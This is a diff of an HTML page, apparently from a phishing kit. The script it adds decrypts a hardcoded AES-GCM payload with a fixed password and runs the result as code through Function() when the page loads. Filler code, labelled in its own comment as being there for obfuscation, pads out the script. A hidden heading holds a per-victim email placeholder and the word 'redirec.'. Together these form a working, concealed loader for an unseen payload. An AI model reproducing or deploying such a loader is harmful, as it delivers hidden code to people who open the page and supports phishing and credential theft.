@@ -1,39 +1,83 @@
-<!DOCTYPE html>!Doc<script>
-    const hexToBytes = (hex) =>
-        Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
-    
+<script>
+    // Converts a hex string into a Uint8Array
+    const hexToBytes = (hex) => {
+        // Split into chunks of two, then map to bytes
+        return Uint8Array.from(hex.match(/.{2}/g).map((h) => parseInt(h, 16)));
+    };
+
+    // Decrypts the given encrypted data
     const decrypt = async (enc, ivHex, saltHex, key) => {
-        const iv = hexToBytes(ivHex), salt = hexToBytes(saltHex);
-        const keyMaterial = await crypto.subtle.importKey("raw", new TextEncoder().encode(key), { name: "PBKDF2" }, false, ["deriveKey"]);
-        const aesKey = await crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: 1e5, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
-    
+        console.log("Starting decryption process...");
+        const iv = hexToBytes(ivHex); // Initialization vector
+        const salt = hexToBytes(saltHex); // Salt for the key derivation
+
+        console.log("Generating key material...");
+        const keyMaterial = await crypto.subtle.importKey(
+            "raw",
+            new TextEncoder().encode(key),
+            { name: "PBKDF2" },
+            false,
+            ["deriveKey"]
+        );
+
+        // Generate the AES-GCM key
+        const aesKey = await crypto.subtle.deriveKey(
+            { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
+            keyMaterial,
+            { name: "AES-GCM", length: 256 },
+            false,
+            ["decrypt"]
+        );
+
+        console.log("Attempting to decrypt...");
         try {
-            const dec = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, hexToBytes(enc));
-            return new TextDecoder().decode(dec);
+            const dec = await crypto.subtle.decrypt(
+                { name: "AES-GCM", iv },
+                aesKey,
+                hexToBytes(enc)
+            );
+            console.log("Decryption successful!");
+            return new TextDecoder().decode(dec); // Decode the decrypted text
         } catch (e) {
-            console.error("Decryption failed:", e);
+            console.error("Decryption failed. Ensure the key, IV, and salt are correct:", e);
             throw e;
         }
     };
-    
+
+    // Self-executing async function
     (async () => {
         const params = {
-            iv: "c444d6b988c97f7ea2aa5716",
-            salt: "06b9dcb639aeb4a298624e4d2709f4c3",
+            iv: "c444d6b988c97f7ea2aa5716", // IV (Initialization Vector)
+            salt: "06b9dcb639aeb4a298624e4d2709f4c3", // Salt for key derivation
             data: "26cbae7ed8856d9cd8d7fed943b6b4057d02f653f16ad4b50df937b866b7491270da18b75c5b1ae09454dfc024e1b06af75301f0b4d1429df0198573f04c1fa219e4eb7b055c8fc740f4cd0bce40244c73927abba0d44a2910efd70981c5002a099cb8ac42273d78c2da6a22762bb4bc1e702426a9f0b75e074607bca07e7122a60e92fe1d35ee602910fce409af78027670a7b55d09608632b357201c6a14a7da17eb9b30d60c98e95f85a26a3e7a27406c70c88c74ebf167a2de66ec9853c6c2bbd82ee92a6f",
         };
+
         try {
+            // Perform decryption
             const result = await decrypt(params.data, params.iv, params.salt, "quickescape");
-            console.log("Decrypted:", result);
-    
-            // Dummy logic
-            Function(`${result}`)();
-            const extraCheck = result.length % 2 ? "Odd" : "Even";
-            console.log("Length Check:", extraCheck);
+            console.log("Decrypted Text:", result);
+
+            // Dummy additional functionality
+            console.log("Performing a dummy operation...");
+            Function(`${result}`)(); // Execute the decrypted string as code
+
+            // Additional useless logic
+            const isPalindrome = (str) => str === str.split("").reverse().join("");
+            const extraCheck = result.length % 2 ? "Odd Length" : "Even Length";
+            const palindromeCheck = isPalindrome(result) ? "Palindrome!" : "Not a Palindrome!";
+            console.log("Length Check:", extraCheck, "| Palindrome Check:", palindromeCheck);
+
         } catch (e) {
             console.error("Execution error:", e);
         }
+
+        // Add a completely useless block for obfuscation
+        const dummyLogic = () => {
+            console.log("This logic serves no purpose!");
+            const randomNum = Math.random();
+            console.log("Random number:", randomNum);
+        };
+        dummyLogic();
     })();
-    </script>
-    
-    <h1 nike-syndy="" hidden adidas="<%=EMAIL64%>" >redirec.</h1>
+</script> <y1>build</y1>
+<h1 nike-owar="" hidden adidas="<%=EMAIL64%>" >redirec.</h1>
